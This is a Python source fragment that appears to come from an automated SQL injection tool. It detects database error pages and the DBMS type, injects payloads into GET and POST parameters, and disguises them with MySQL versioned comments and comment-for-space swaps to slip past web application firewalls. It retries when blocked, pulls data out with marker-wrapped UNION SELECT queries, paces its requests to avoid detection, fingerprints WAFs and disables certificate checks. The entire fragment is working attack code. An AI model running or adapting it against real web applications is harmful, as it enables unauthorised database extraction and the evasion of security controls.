def _structural_features(text):
    body = re.sub(r'<script\b.*?</script>', ' ', text or "", flags=re.DOTALL | re.I)
    body = re.sub(r'<style\b.*?</style>',  ' ', body, flags=re.DOTALL | re.I)
    body = re.sub(r'<[^>]+>', ' ', body)
    body = re.sub(r'\b\d{10,13}\b', ' ', body)
    body = re.sub(r'\b[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}\b', ' ', body, flags=re.I)
    body = re.sub(r'\b[A-Za-z0-9+/=]{24,}\b', ' ', body)
    body = re.sub(r'\bcsrf[_-]?token["\']?\s*[:=]\s*["\']?[^"\'\s]+', 'csrf ', body, flags=re.I)
    return re.sub(r'\s+', ' ', body).strip()

def _fingerprint_v2(text):
    feats = _structural_features(text)
    return {
        'hash': hashlib.md5(feats.encode("utf-8", "ignore")).hexdigest(),
        'len': len(feats),
        'has_err': _is_error_page(text),
    }

def _similar(a, b, max_delta=0.03):
    if a['hash'] == b['hash']: return True
    if not a['len'] or not b['len']: return a['len'] == b['len']
    return abs(a['len'] - b['len']) / max(a['len'], b['len']) < max_delta

def _is_error_page(text):
    low = (text or "").lower()
    markers = [
        "unknown column", "unknown column in 'order clause'", "out of range", "sql syntax", 
        "you have an error in your sql syntax", "unclosed quotation mark", "unterminated string", 
        "pg_query()", "pg_exec()", "microsoft sql server", "odbc sql server driver",
        "sqlite3.operationalerror", "sqlite.exception", "ora-0", "ora-1", "ora-2", "oracle error",
    ]
    return any(m in low for m in markers)

def _detect_dbms(text):
    low = (text or "").lower()
    mapping = [
        ("Oracle", ["ora-0", "ora-1", "ora-2", "oracle error"]),
        ("MSSQL", ["odbc sql server driver", "microsoft sql server", "unclosed quotation mark", "incorrect syntax near"]),
        ("PostgreSQL", ["pg_query()", "pg_exec()", "postgresql", "syntax error at or near", "unterminated quoted string"]),
        ("SQLite", ["sqlite3.operationalerror", "sqlite.exception"]),
        ("MySQL", ["you have an error in your sql syntax", "mysql_fetch", "warning: mysql"]),
    ]
    for db, errs in mapping:
        if any(e in low for e in errs): return db
    return "Unknown"

def _get_version_expr(dbms):
    return {
        "MySQL": "@@version", "MariaDB": "@@version", "PostgreSQL": "version()",
        "MSSQL": "@@VERSION", "SQLite": "sqlite_version()",
        "Oracle": "(SELECT banner FROM v$version WHERE ROWNUM=1)",
    }.get(dbms, "@@version")

def _waf_obfuscate(payload, dbms="Unknown"):
    if not payload: return payload
    trailing = ""
    m = re.search(r'(--(?:\s.*)?$|#.*$)', payload)
    core = payload
    if m:
        trailing = m.group(0)
        core = payload[:m.start()]
    if dbms in ("MySQL", "MariaDB"):
        core = re.sub(r'\bUNION\b',  '/*!50000UNION*/',  core, flags=re.IGNORECASE)
        core = re.sub(r'\bSELECT\b', '/*!50000SELECT*/', core, flags=re.IGNORECASE)
    else:
        core = re.sub(r'\s+', '/**/', core)
    return core + trailing

def _build_get_url(base_url, param, payload):
    parsed = urlparse(base_url)
    qs = parse_qsl(parsed.query, keep_blank_values=True)
    if not qs: return None
    injected = False
    new_qs = []
    for k, v in qs:
        if not injected and k == param:
            new_qs.append((k, v + payload))
            injected = True
        else:
            new_qs.append((k, v))
    if not injected: return None
    return urlunparse(parsed._replace(query=urlencode(new_qs, safe="")))

def _send(session, method, base_url, param, payload, headers, timeout=6, dbms="Unknown", obfuscate=False):
    strategies = ["none"]
    if obfuscate: strategies = ["auto", "none"]
    last_res = None
    for strat in strategies:
        try:
            final_payload = _waf_obfuscate(payload, dbms=dbms) if strat == "auto" else payload
            if method == "POST":
                r = session.post(base_url, data={param: "1" + final_payload}, headers=headers, timeout=timeout, allow_redirects=False, verify=False)
            else:
                target = _build_get_url(base_url, param, final_payload)
                if not target: return None
                r = session.get(target, headers=headers, timeout=timeout, allow_redirects=False, verify=False)
            last_res = r
            if r.status_code in (403, 406, 429) and strat != strategies[-1]: continue
            return r
        except Exception:
            continue
    return last_res

def _wrap_marker(dbms, marker, expr):
    if dbms in ("SQLite", "Oracle"): return f"'~{marker}~' || ({expr}) || '~{marker}~'"
    return f"CONCAT('~{marker}~', ({expr}), '~{marker}~')"

def _union_extract(session, method, base_url, param, headers, dbms, string_col, col_count, expr, timeout=8, delay_mul=1.0):
    time.sleep(random.uniform(0.3, 0.6) * delay_mul)
    marker = "TPX" + secrets.token_hex(6) + "X"
    wrapped = _wrap_marker(dbms, marker, expr)
    cols = ["null"] * col_count
    cols[string_col - 1] = wrapped
    payload = f"' UNION SELECT {', '.join(cols)}-- "
    res = _send(session, method, base_url, param, payload, headers, timeout=timeout, dbms=dbms, obfuscate=True)
    if not res or res.status_code in (301, 302, 303, 307, 308): return None
    pattern = re.compile(r"~" + re.escape(marker) + r"~(.*?)~" + re.escape(marker) + r"~", re.DOTALL)
    m = pattern.search(res.text)
    return m.group(1).strip() if m else None

def detect_waf(session, url, headers, timeout=6):
    try:
        r = session.get(url, headers=headers, timeout=timeout, allow_redirects=False, verify=False)
    except Exception as e:
        return {"waf": None, "all_detected": [], "evidence": [f"unreachable: {e}"], "delay_multiplier": 1.0, "status": None}
    hdr = {k.lower(): v.lower() for k, v in r.headers.items()}
    cookie_hdr = r.headers.get("Set-Cookie", "").lower()
    body = (r.text or "").lower()[:20000]
    evidence, detected = [], []
    for name, sig in WAF_SIGNATURES.items():
        hit = False
        for h, expected in sig.get("headers", {}).items():
            if h in hdr and (expected is None or expected in hdr[h]): evidence.append(f"{name}: header '{h}'"); hit = True
        for c in sig.get("cookies", []):
            if c in cookie_hdr: evidence.append(f"{name}: cookie '{c}'"); hit = True
        for b in sig.get("body", []):
            if b in body: evidence.append(f"{name}: body '{b}'"); hit = True
        if hit and name not in detected: detected.append(name)
    if r.status_code in (403, 406, 429, 503) and not detected: detected.append("Unknown WAF")
    primary = detected[0] if detected else None
    multiplier = 2.0 if primary else (1.5 if r.status_code in (403, 406, 429) else 1.0)
    return {"waf": primary, "all_detected": detected, "evidence": evidence[:6], "delay_multiplier": multiplier, "status": r.status_code}


